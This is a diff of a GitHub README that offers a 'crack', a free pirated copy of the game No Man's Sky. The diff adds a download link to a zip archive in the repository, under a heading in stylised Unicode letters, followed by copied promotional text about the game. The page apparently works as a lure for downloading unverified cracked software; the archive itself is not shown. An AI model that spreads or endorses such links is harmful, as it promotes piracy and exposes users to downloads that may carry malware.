@@ -1,6 +1,6 @@
 # No-Man's-Sky-Crck-2024-Free
 
-## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/BlackEr35/No-Man-s-Sky-Crck-2024-Free/releases/download/No-Man's-Sky-Crck-2024-Free/No-Man.s-Sky-Crck-2024-Free.zip)
 
 
 In No Man's Sky, each star is the light of a distant sun, orbiting inhabited planets that you can go to if you wish. Move freely between the expanses of deep space and the surfaces of planets, without any loading screens and restrictions. In this endless, procedurally generated universe, you will discover places and creatures that you have not seen before and are probably unlikely to see ever again.
